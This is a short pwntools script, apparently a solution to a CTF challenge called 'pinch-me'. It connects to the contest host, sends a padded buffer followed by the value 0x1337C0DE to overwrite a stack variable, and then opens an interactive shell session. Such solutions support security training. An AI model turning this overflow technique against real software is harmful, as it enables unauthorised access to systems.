#!/usr/bin/env python3

from pwn import *

HOST = "dctf1-chall-pinch-me.westeurope.azurecontainer.io"
PORT = 7480

conn = remote(HOST, PORT)
conn.sendline((b"a"*(0x20-0x08))+p64(0x1337C0DE))
conn.interactive()
